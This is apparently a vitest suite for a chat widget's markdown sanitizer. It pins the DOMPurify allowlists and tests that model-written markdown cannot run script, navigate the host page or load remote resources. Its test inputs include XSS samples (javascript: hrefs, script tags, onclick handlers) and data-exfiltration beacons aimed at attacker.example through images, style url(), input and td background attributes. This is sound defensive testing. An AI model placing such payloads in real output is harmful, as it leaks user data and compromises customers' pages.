// tests/markdown.spec.ts — Allowlist pin + behavior for the extracted markdown
// core. Created 2026-07-15 (A3 glass bar). The allowlist test PINS the exact
// DOMPurify ALLOWED_TAGS/ALLOWED_ATTR arrays — this sanitizes agent-authored
// markdown on a PUBLIC origin, so any silent change to the allowlist is an XSS
// regression and must fail here. Runs under jsdom (DOMPurify.sanitize needs a
// window).
//
// 2026-09-26 (reply links + model images): the pin used to guard against drift
// from paw-enterprise's MarkdownRenderer.svelte, whose allowlist this one was
// copied from. It no longer matches that source, on purpose: this renderer runs
// in a cross-origin iframe on a customer's page, so it drops `img` (a model-
// written image is a request fired on render, i.e. a beacon), stops passing a
// model-written `target` through (`_top` navigates the customer's whole page),
// and replaces DOMPurify's default attribute list with an explicit one (the
// defaults let `style="background:url(..)"`, `<input type=image src>` and
// `<td background>` load remote resources). The pin now guards THIS app's
// allowlist. The link/image behavior tests below were written red-first.
import { describe, it, expect } from 'vitest';
import {
  MARKDOWN_ALLOWED_TAGS,
  MARKDOWN_ALLOWED_ATTR,
  renderMarkdown,
  parseSegments,
} from '../src/lib/markdown';

function dom(html: string): HTMLElement {
  const host = document.createElement('div');
  host.innerHTML = html;
  return host;
}

describe('DOMPurify allowlist (pinned; diverges from paw-enterprise on purpose)', () => {
  it('pins the exact ALLOWED_TAGS set (no img: model output must not load images)', () => {
    expect(MARKDOWN_ALLOWED_TAGS).toEqual([
      'p', 'br', 'strong', 'em', 'del', 'a', 'ul', 'ol', 'li',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'code', 'pre', 'hr', 'sup', 'sub', 'span', 'div',
      'input',
    ]);
  });

  it('pins the exact ALLOWED_ATTR set (no target/rel/style/src; the link hook owns target+rel)', () => {
    expect(MARKDOWN_ALLOWED_ATTR).toEqual([
      'href', 'title', 'align', 'start', 'type', 'disabled', 'checked', 'colspan', 'rowspan', 'scope',
    ]);
  });

  it('has no script/style/iframe/form/svg/img in the allowlist', () => {
    for (const forbidden of ['script', 'style', 'iframe', 'form', 'svg', 'object', 'embed', 'link', 'img']) {
      expect(MARKDOWN_ALLOWED_TAGS as readonly string[]).not.toContain(forbidden);
    }
  });
});

describe('reply links leave the widget, never the customer page', () => {
  for (const target of ['_top', '_parent', '_self']) {
    it(`rewrites an injected target="${target}" to _blank + noopener`, () => {
      const html = renderMarkdown(
        `<a href="https://evil.example" target="${target}" rel="opener">Returns policy</a>`,
      );
      const a = dom(html).querySelector('a')!;
      expect(a).not.toBeNull();
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    });
  }

  it('gives a plain markdown link target=_blank + noopener', () => {
    const a = dom(renderMarkdown('[Returns](https://site.example/returns)')).querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://site.example/returns');
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
  });

  for (const href of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)']) {
    it(`drops a ${href.slice(0, 10)} href entirely`, () => {
      const a = dom(renderMarkdown(`<a href="${href}">x</a>`)).querySelector('a')!;
      expect(a.hasAttribute('href')).toBe(false);
    });
  }

  for (const href of ['/returns', '//evil.example/x', 'ftp://files.example/x', 'data:text/html,hi']) {
    it(`drops a non-allowlisted href (${href})`, () => {
      const a = dom(renderMarkdown(`<a href="${href}">x</a>`)).querySelector('a')!;
      expect(a.hasAttribute('href')).toBe(false);
    });
  }

  for (const href of ['mailto:help@site.example', 'tel:+15551234567', 'http://site.example/x']) {
    it(`keeps an allowlisted href (${href})`, () => {
      const a = dom(renderMarkdown(`<a href="${href}">x</a>`)).querySelector('a')!;
      expect(a.getAttribute('href')).toBe(href);
      expect(a.getAttribute('target')).toBe('_blank');
    });
  }
});

describe('model output cannot load remote resources', () => {
  it('a markdown image renders no <img> (alt text only)', () => {
    const html = renderMarkdown('See ![our <b>logo</b>](https://attacker.example/p?d=secret) here');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
    expect(dom(html).textContent).toContain('our <b>logo</b>');
  });

  it('a linked image degrades to a normal link around the alt text', () => {
    const a = dom(renderMarkdown('[![Logo](https://x.example/l.png)](https://site.example)')).querySelector('a')!;
    expect(a.textContent).toBe('Logo');
    expect(a.getAttribute('href')).toBe('https://site.example');
  });

  it('raw <img src> HTML renders no <img>', () => {
    const html = renderMarkdown('<img src="https://attacker.example/p?d=secret" alt="x">');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
  });

  it('strips a style url() beacon', () => {
    const html = renderMarkdown('<span style="background:url(https://attacker.example/s)">s</span>');
    expect(html).not.toContain('attacker.example');
  });

  it('strips an <input type=image src> beacon', () => {
    const html = renderMarkdown('<input type="image" src="https://attacker.example/i">');
    expect(html).not.toContain('attacker.example');
  });

  it('strips a <td background> beacon', () => {
    const html = renderMarkdown('<table><tr><td background="https://attacker.example/t">c</td></tr></table>');
    expect(html).not.toContain('attacker.example');
  });

  it('still renders GFM task checkboxes, table alignment and ordered-list start', () => {
    const tasks = dom(renderMarkdown('- [x] done\n- [ ] todo'));
    expect(tasks.querySelectorAll('input[type="checkbox"]').length).toBe(2);
    expect(tasks.querySelector('input[checked]')).not.toBeNull();
    expect(renderMarkdown('| a |\n|:-|\n| 1 |')).toContain('align="left"');
    expect(renderMarkdown('3. three\n4. four')).toContain('start="3"');
  });
});

describe('renderMarkdown sanitization', () => {
  it('strips a script tag from agent markdown', () => {
    const html = renderMarkdown('Hello <script>alert(1)</script> world');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('alert(1)');
  });

  it('strips inline event handlers and javascript: hrefs', () => {
    const html = renderMarkdown('<a href="javascript:alert(1)" onclick="steal()">x</a>');
    expect(html).not.toContain('onclick');
    expect(html).not.toContain('javascript:');
  });

  it('renders gfm tables wrapped for mobile scroll', () => {
    const html = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |');
    expect(html).toContain('<table');
    expect(html).toContain('pawbar-table-wrapper');
  });

  it('keeps basic emphasis + links', () => {
    const html = renderMarkdown('**bold** and [link](https://example.com)');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('href="https://example.com"');
  });
});

describe('parseSegments', () => {
  it('splits prose and a fenced code block', () => {
    const segs = parseSegments('Try this:\n```js\nconst x = 1;\n```\nDone.');
    expect(segs.map((s) => s.type)).toEqual(['html', 'code', 'html']);
    const code = segs.find((s) => s.type === 'code');
    expect(code && 'code' in code && code.code).toContain('const x = 1;');
    expect(code && 'lang' in code && code.lang).toBe('js');
  });

  it('masks an in-flight unclosed fence while streaming', () => {
    const segs = parseSegments('Here is code:\n```python\nprint(', true);
    expect(segs.map((s) => s.type)).toEqual(['html', 'code-loading']);
  });

  it('does not mask the unclosed fence when not streaming', () => {
    const segs = parseSegments('Here is code:\n```python\nprint(', false);
    expect(segs.some((s) => s.type === 'code-loading')).toBe(false);
  });
});
